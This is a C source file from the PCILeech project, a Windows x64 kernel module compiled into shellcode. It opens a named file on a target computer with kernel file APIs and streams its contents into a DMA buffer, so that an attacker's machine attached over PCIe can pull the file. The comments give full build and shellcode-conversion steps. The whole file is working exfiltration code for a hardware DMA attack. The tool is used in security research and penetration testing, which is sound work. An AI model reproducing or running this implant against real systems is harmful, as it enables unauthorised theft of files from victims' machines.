// wx64_filepull.c : kernel code to pull files from target system.
// Compatible with Windows x64.
//
// (c) Ulf Frisk, 2016
// Author: Ulf Frisk, pcileech@frizk.net
//
// compile with:
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel wx64_common.c
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel wx64_filepull.c
// ml64 wx64_common_a.asm /Fewx64_filepull.exe /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main wx64_filepull.obj wx64_common.obj
// shellcode64.exe -o wx64_filepull.exe "PULL FILES FROM TARGET SYSTEM                                  \n===============================================================\nPull a file from the target system to the local system.        \nREQUIRED OPTIONS:                                              \n  -out : file on local system to write result to.              \n         filename is given in normal format.                   \n         Example: '-out c:\temp\myexefile.exe'                 \n  -s   : file on target system.                                \n         filename is given in kernel format (\??\-prefix)      \n         Example: '-s \??\c:\program files\myexefile.exe'      \n===== PULL ATTEMPT DETAILED RESULT INFORMATION ================\nFILE NAME     : %s\nNTSTATUS      : 0x%08X\n===============================================================\n"
// 
#include "wx64_common.h"

#define STATUS_UNSUCCESSFUL						0xC0000001
#define OBJ_CASE_INSENSITIVE    				0x00000040
#define FILE_SYNCHRONOUS_IO_NONALERT			0x00000020
#define FILE_OPEN								0x00000001
#define FILE_OVERWRITE_IF						0x00000005
#define OBJ_KERNEL_HANDLE       				0x00000200

VOID c_EntryPoint(_In_ PKMDDATA pk)
{
	NTSTATUS nt;
	HANDLE hFile;
	IO_STATUS_BLOCK _io;
	OBJECT_ATTRIBUTES _oa;
	ANSI_STRING _sa;
	UNICODE_STRING _su;
	KERNEL_FUNCTIONS ofnk;
	PKERNEL_FUNCTIONS fnk;
	BOOL isModeLargeTransfer = FALSE;
	if(!pk->dataInStr[0]) {
		pk->dataOut[0] = (QWORD)STATUS_UNSUCCESSFUL;
		return;
	}
	// initialize kernel functions and strings
	InitializeKernelFunctions(pk->AddrKernelBase, &ofnk);
	fnk = &ofnk;
	fnk->RtlInitAnsiString(&_sa, pk->dataInStr);
	fnk->RtlCopyMemory(pk->dataOutStr, pk->dataInStr, 260);
	fnk->RtlAnsiStringToUnicodeString(&_su, &_sa, TRUE);
	fnk->RtlZeroMemory(&_oa, sizeof(OBJECT_ATTRIBUTES));
	fnk->RtlZeroMemory(&_io, sizeof(IO_STATUS_BLOCK));
	InitializeObjectAttributes(
		&_oa,
		&_su,
		OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
		NULL,
		NULL);
	// open, write and close file.
	if(fnk->KeGetCurrentIrql() != PASSIVE_LEVEL) {
		pk->dataOut[0] = (QWORD)STATUS_UNSUCCESSFUL;
		goto cleanup;
	}
	nt = fnk->ZwCreateFile(&hFile, GENERIC_READ, &_oa, &_io, NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_OPEN, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
	if(0 != nt) {
		pk->dataOut[0] = nt;
		goto cleanup;
	}
	do {
		nt = fnk->ZwReadFile(hFile, NULL, NULL, NULL, &_io, (PVOID)(pk->DMAAddrVirtual + pk->dataOutExtraOffset), (ULONG)pk->dataOutExtraLengthMax, NULL, 0);
		if(NT_ERROR(nt)) { break; }
		pk->dataOutExtraLength = (QWORD)_io.Information;
		if(pk->dataOutExtraLength != pk->dataOutExtraLengthMax) { break; }
		isModeLargeTransfer = TRUE;
	} while(WriteLargeOutput_WaitNext(fnk, pk));
	fnk->ZwClose(hFile);
	if(isModeLargeTransfer) { 
		WriteLargeOutput_Finish(fnk, pk); 
	}
	pk->dataOut[0] = nt;
cleanup:
	fnk->RtlFreeUnicodeString(&_su);
}
